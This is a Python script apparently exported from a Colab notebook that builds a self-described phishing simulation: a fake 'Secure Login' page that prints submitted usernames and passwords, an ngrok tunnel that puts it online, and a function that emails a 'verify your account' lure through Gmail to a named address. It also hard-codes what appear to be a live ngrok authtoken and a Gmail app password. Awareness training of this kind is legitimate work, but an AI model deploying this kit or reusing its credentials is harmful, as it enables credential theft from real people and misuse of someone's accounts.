# -*- coding: utf-8 -*-
"""Untitled2.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/1NurnSgbAYbUO8-xxfcjuRRbvi4zKvoZc
"""

!pip install flask pyngrok

import sqlite3

def initialize_database():
    """
    Creates a database to store simulation results.
    """
    connection = sqlite3.connect("phishing_simulation.db")
    cursor = connection.cursor()

    # Create a table to store results
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS simulation_results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_email TEXT NOT NULL,
            clicked_link BOOLEAN DEFAULT 0,
            entered_credentials BOOLEAN DEFAULT 0
        )
    """)

    connection.commit()
    connection.close()
    print("Database initialized successfully.")

initialize_database()

from flask import Flask, request, render_template_string
from pyngrok import ngrok

app = Flask(__name__)

FAKE_LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Login</title>
</head>
<body>
    <h2>Login to Your Account</h2>
    <form method="POST" action="/submit">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br><br>

        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>

        <button type="submit">Sign In</button>
    </form>
</body>
</html>
"""

@app.route("/")
def login_page():
    return render_template_string(FAKE_LOGIN_PAGE)

@app.route("/submit", methods=["POST"])
def handle_login():
    username = request.form.get("username")
    password = request.form.get("password")
    # Log the data (educational use only)
    print(f"Captured credentials - Username: {username}, Password: {password}")
    return (
        "<h3>Oops! This was a test.</h3>"
        "<p>Remember to always verify URLs and avoid entering sensitive information into unknown websites.</p>"
    )

# Step 1: Configure ngrok authtoken
!ngrok config add-authtoken "2qtcZPEKPcyEUYXlOrquRTew1Jg_61g2LR8PiAVSBqTee7Nse"

# Step 2: Import Flask and pyngrok
from flask import Flask
from pyngrok import ngrok

# Step 3: Create a simple Flask app
app = Flask(__name__)

@app.route("/")
def index():
    return "Welcome to the phishing simulation (educational use only)!"

# Step 4: Start ngrok and Flask
public_url = ngrok.connect(5000).public_url
print(f"Fake phishing login page is live at {public_url}")
app.run(port=5000)

import smtplib
from email.message import EmailMessage

def send_phishing_email(recipient_email, phishing_link):
    """
    Sends a phishing simulation email to the target user.
    """
    message = EmailMessage()
    message.set_content(
        f"Hello,\n\nWe noticed suspicious activity on your account. "
        f"Please verify your account by clicking the link below:\n\n{phishing_link}\n\n"
        "Thank you,\nYour Security Team"
    )
    message["Subject"] = "Action Required: Verify Your Account"
    message["From"] = "sriram.dk2004@gmail.com"
    message["To"] = recipient_email

    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_user = "sriram.dk2004@gmail.com"
    smtp_password = "efwx zxxe xsjy qtgk"

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(smtp_user, smtp_password)
            server.send_message(message)
            print(f"Email sent to {recipient_email}")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Example usage
send_phishing_email("sd8595228@gmail.com", public_url)